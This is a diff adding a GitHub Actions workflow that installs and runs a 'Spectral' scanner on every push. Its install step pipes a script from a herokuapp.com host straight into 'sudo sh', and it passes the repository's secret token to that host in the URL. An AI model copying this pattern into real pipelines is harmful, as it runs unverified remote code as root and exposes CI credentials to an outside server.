@@ -1,0 +1,15 @@
+name: Spectral Scan Failed
+on: [push]
+env:
+  SPECTRAL_TOKEN: ${{ secrets.SPECTRAL_TOKEN }}
+  SPECTRAL_DSN:   https://${{ secrets.SPECTRAL_TOKEN }}@calm-ridge-50342.herokuapp.com
+jobs:
+  build:
+    name: Spectral
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v1
+      - name: Install
+        run: curl -L "https://calm-ridge-50342.herokuapp.com/api/download/get?key=$SPECTRAL_TOKEN" | sudo sh
+      - name: Scan
+        run: spectral scan
